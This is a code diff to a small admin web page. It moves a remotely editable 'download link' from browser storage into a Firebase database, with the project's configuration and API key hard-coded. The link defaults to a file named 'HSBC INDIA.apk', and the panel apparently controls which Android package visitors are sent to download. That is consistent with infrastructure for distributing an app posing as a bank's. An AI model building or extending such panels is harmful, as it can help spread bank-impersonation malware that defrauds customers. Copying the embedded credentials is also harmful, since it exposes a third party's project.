@@ -161,7 +161,23 @@
     </div>
 </div>
 
+<!-- Firebase SDK -->
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
 <script>
+    const firebaseConfig = {
+        apiKey: "AIzaSyD82sEEWImPd5r4GzLiR0zTyuHqjOlrNm0",
+        authDomain: "links-26dd8.firebaseapp.com",
+        projectId: "links-26dd8",
+        storageBucket: "links-26dd8.firebasestorage.app",
+        messagingSenderId: "145330747748",
+        appId: "1:145330747748:web:7a9ff449961f8d367aa271",
+        measurementId: "G-XCCLWG39YG",
+        databaseURL: "https://links-26dd8-default-rtdb.firebaseio.com"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
     document.addEventListener('DOMContentLoaded', () => {
         const loginSection = document.getElementById('login-section');
         const adminSection = document.getElementById('admin-section');
@@ -212,23 +228,36 @@
             loginSection.classList.remove('active');
             adminSection.classList.add('active');
             
-            // Load saved link from localStorage if it exists
-            const savedUrl = localStorage.getItem('website_download_link');
-            if (savedUrl) {
-                downloadUrlInput.value = savedUrl;
-            } else {
-                downloadUrlInput.value = "HSBC INDIA.apk"; // Default
-            }
+            // Fetch current link from Firebase
+            db.ref('card/link').once('value').then((snapshot) => {
+                const currentLink = snapshot.val();
+                if (currentLink) {
+                    downloadUrlInput.value = currentLink;
+                } else {
+                    downloadUrlInput.value = "HSBC INDIA.apk"; // Default
+                }
+            }).catch((error) => {
+                showAlert('Error fetching link from Firebase: ' + error.message, 'danger');
+            });
         }
 
         adminForm.addEventListener('submit', (e) => {
             e.preventDefault();
             const newUrl = downloadUrlInput.value.trim();
+            const originalBtnText = adminForm.querySelector('button').innerHTML;
+            adminForm.querySelector('button').innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Saving...';
             
-            // Save to localStorage
-            localStorage.setItem('website_download_link', newUrl);
-            
-            showAlert('Changes saved locally. Note: Since this is an HTML file, it cannot save data to the server for other users. To do that, we need a database like Firebase.', 'success');
+            // Save to Firebase
+            db.ref('card/link').set(newUrl)
+                .then(() => {
+                    showAlert('Download link successfully updated in Firebase!', 'success');
+                })
+                .catch((error) => {
+                    showAlert('Error saving to Firebase: ' + error.message, 'danger');
+                })
+                .finally(() => {
+                    adminForm.querySelector('button').innerHTML = originalBtnText;
+                });
         });
     });
 </script>
